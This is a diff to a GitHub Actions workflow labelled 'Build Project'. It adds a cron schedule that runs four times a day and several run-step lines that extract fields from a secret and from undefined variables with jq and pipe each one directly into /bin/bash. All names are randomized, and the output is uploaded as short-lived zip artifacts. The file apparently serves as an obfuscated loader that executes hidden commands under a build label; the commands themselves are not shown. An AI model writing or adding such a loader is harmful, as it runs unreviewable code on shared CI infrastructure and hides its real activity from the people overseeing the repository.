@@ -2,6 +2,8 @@ name: Build Project
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '59 2,8,14,20 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,15 +16,19 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          m88: ${{ secrets.m88 }}
+          zqvkl34: ${{ secrets.zqvkl34 }}
         run: |
-          printf '%s' "$m88" | jq -r .a39 | /bin/bash
-          echo $fpweg33835 | jq -r .fion0928 | /bin/bash
-          echo $xg085 | jq -r .ntuvi32 | /bin/bash
+          printf '%s' "$zqvkl34" | jq -r .b37525 | /bin/bash
+          echo $hp4338 | jq -r .ztqk76 | /bin/bash
+          echo $x01426 | jq -r .sh84 | /bin/bash
+          printf '%s' "$m7" | jq -r .s6174 | /bin/bash
+          echo $ywis5859 | jq -r .dkn2295 | /bin/bash
+          echo $jc7203 | jq -r .pb3068 | /bin/bash
+          printf '%s' "$qkttg9" | jq -r .pevtr064 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: sr8lghd2
+          name: 9E2yTl4C
           path: "*.zip"
           retention-days: 1
